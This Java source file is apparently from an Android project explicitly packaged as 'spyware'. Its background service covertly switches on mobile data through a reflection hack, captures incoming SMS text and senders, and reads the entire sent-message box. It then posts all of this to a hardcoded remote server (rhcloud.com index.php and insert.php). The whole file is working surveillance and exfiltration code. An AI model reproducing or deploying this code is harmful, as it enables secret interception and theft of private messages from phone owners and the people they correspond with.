package com.example.administrator.spyware;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Administrator on 12/26/2015.
 */
public class Send extends Service {
    String content=null;
    String from=null;
    JSONArray jsonArray;
    JSONObject jsonObject;
   // WifiManager wifiManager;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;

    }

    @Override
    public void onCreate() {
        super.onCreate();
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
       /* wifiManager=(WifiManager)getSystemService(getApplicationContext().WIFI_SERVICE);
        if(!wifiManager.isWifiEnabled()){
            wifiManager.setWifiEnabled(true);
        }*/

        /*Enable 3G*/
        ConnectivityManager cm =
                (ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE);

        try {
            Method dataMtd;
            dataMtd =
                    ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled",
                            boolean.class);
            if(dataMtd.isAccessible()){
                dataMtd.setAccessible(false);
                dataMtd.invoke(cm, false);
            }
            else {
                dataMtd.setAccessible(true);
                dataMtd.invoke(cm, true);
            }
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalArgumentException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
        Bundle bd=intent.getExtras();
        content=bd.getString("content");
        from=bd.getString("from");
        Thread t=new Thread(new Runnable() {
            @Override
            public void run() {
                new Send_Data().execute("http://khangserver-khangit.rhcloud.com/index.php");
            }
        });
        t.start();

        /*Đọc tin nhắn sentbox*/
        ArrayList<String> smsSentbox = new ArrayList<String>();
        Uri uri = Uri.parse("content://sms/sent");
        Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, null, null, null);
        int count = cursor.getCount();//đếm số tin nhắn
        if (count != 0) {
            cursor.moveToFirst();
            String bodySms = null;
            String address = null;
            String date = null;
            date = cursor.getString(2);
            address = cursor.getString(1);
            bodySms = cursor.getString(3);
            smsSentbox.add(bodySms.toString());
            while (cursor.moveToNext()) {
                date = cursor.getString(2);
                address = cursor.getString(1);
                bodySms = cursor.getString(3);
                smsSentbox.add(bodySms.toString());
            }
            jsonObject=null;
            jsonArray=new JSONArray();
            for(int i=0;i<smsSentbox.size();i++){
                jsonObject=new JSONObject();
                try {
                    jsonObject.put("content",smsSentbox.get(i).toString());
                    jsonArray.put(jsonObject);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        }
        Thread t1=new Thread(new Runnable() {
            @Override
            public void run() {
                new Sentbox().execute("http://khangserver-khangit.rhcloud.com/insert.php");
            }
        });
        t1.start();
    }



    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    /*Send received sms */
    private String makePostRequest(String param) {
        HttpClient httpClient = new DefaultHttpClient();

        // URL của trang web nhận request
        HttpPost httpPost = new HttpPost(param);

        // Các tham số truyền
        List nameValuePair = new ArrayList(2);
        nameValuePair.add(new BasicNameValuePair("content", content));
        nameValuePair.add(new BasicNameValuePair("from", from));

        //Encoding POST data
        try {
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair, "utf-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        String kq = "";
        try {
            HttpResponse response = httpClient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            kq = EntityUtils.toString(entity);
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return kq;
    }
    class Send_Data extends AsyncTask<String,Integer,String> {
        @Override
        protected String doInBackground(String... params) {
            return makePostRequest(params[0]) ;
        }

        @Override
        protected void onPostExecute(String s) {
           // Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }
    /*Send json array */
    private String makePostRequest_Sentbox(String param) {

        HttpClient httpClient = new DefaultHttpClient();

        // URL của trang web nhận request
        HttpPost httpPost = new HttpPost(param);
        ArrayList<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();
        nameValuePair.add(new BasicNameValuePair("content_sentbox", jsonArray.toString()));

        try {
            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair, "utf-8"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        String kq = "";
        try {
            HttpResponse response = httpClient.execute(httpPost);
            HttpEntity entity = response.getEntity();
            kq = EntityUtils.toString(entity);
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return kq;
    }
    class Sentbox extends AsyncTask<String,Integer,String> {
        @Override
        protected String doInBackground(String... params) {
            return makePostRequest_Sentbox(params[0]) ;
        }

        @Override
        protected void onPostExecute(String s) {
             Toast.makeText(getApplicationContext(),s,Toast.LENGTH_LONG).show();
        }
    }
}


